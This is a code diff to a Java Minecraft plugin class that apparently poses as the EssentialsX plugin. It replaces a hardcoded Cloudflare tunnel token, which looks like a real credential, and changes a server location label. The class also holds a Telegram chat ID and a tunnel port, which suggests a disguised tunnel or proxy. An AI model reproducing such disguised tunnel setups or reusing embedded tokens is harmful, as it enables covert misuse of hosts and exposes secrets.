@@ -20,7 +20,7 @@ public class EssentialsX extends JavaPlugin {
     private int port = 22222;
 
     //Cloudflare隧道Token
-    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiNDA4OWVhMGEtZjQ1OS00ODMzLTlkNjUtZjY5NjA5YTQ0NGU0IiwicyI6Ik9HTXpPRFk1TWpjdE1ETTJNUzAwWXpNMExUZ3hNMll0WW1VNFpXWm1NREUwT1RabSJ9"; //必填
+    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiNWZkMzkxODYtODA3Mi00ZmQzLThiOTItYTFjZjRiNmQ2ZGNmIiwicyI6Ik9XRXlaR1U0WmpjdE0yWTJOQzAwWkdJeUxUazRNamt0TW1ZMU1HRTNNR1kxTkdabSJ9"; //必填
 
     //Cloudflare隧道绑定域名
     private String host = "127.0.0.1"; //必填
@@ -30,7 +30,7 @@ public class EssentialsX extends JavaPlugin {
     private String tgChatId = "5800052646";
 
     // 服务器名称(区分不同服务器通知用)
-    private String servername = "Voer.Host-德国";
+    private String servername = "Voer.Host-美国";
 
     @Override
     public void onEnable() {
